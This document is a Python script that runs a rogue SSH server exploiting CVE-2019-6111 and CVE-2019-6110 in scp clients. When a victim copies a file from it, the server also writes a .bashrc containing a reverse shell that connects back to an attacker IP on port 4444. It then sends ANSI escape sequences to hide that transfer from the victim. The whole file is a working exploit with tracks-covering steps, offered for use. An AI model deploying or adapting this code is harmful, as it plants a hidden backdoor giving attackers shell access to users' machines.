import paramiko
import socket
import threading

dummy = "This is the file you requested.\n"
payload = "sh -i >& /dev/tcp/192.168.145.136/4444 0>&1\n"

class Server(paramiko.server.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_none(self, username):
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_exec_request(self, channel, command):
        command = command.decode("ascii")
        print(f"Approving exec request: {command}")
        parts = command.split(' ')
        assert parts[0] == "scp"
        assert "-f" in parts
        file = parts[-1]
        threading.Thread(target=self.send_file, args=(channel, file)).start()
        return True

    def send_file(self, channel, file):
        '''
        The meat of the exploit:
            1. Send the requested file
            2. Send another file (exploit.txt) that was not requested
            3. Print ANSI escape sequences to stderr to hide the transfer of exploit.txt
        '''
        
        channel.recv(1024)

        print(f"Sending requested file \"{file}\" to channel {channel.get_id()}")
        channel.sendall(f"C0664 {len(dummy)} {file}\n".encode("ascii"))
        channel.recv(1024)
        channel.sendall(dummy)
        channel.sendall(b"\x00")
        channel.recv(1024)

        #CVE-2019-6111
        print(f"Sending malicious file \".bashrc\" to channel {channel.get_id()}")
        channel.sendall(f"C0664 {len(payload)} .bashrc\n".encode("ascii"))
        channel.recv(1024)
        channel.sendall(payload)
        channel.sendall(b"\x00")
        channel.recv(1024)

        #CVE-2019-6110
        print("Covering our tracks by sending ANSI escape sequence")
        channel.sendall_stderr("\x1b[1A\x1b[2K".encode("ascii"))
        channel.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('', 22))
sock.listen()
print("Listening for connection...")

while True:
    client, addr = sock.accept()
    print("Got a connection!")
    transport = paramiko.Transport(client)
    transport.add_server_key(paramiko.rsakey.RSAKey.generate(1024))
    transport.start_server(server=Server())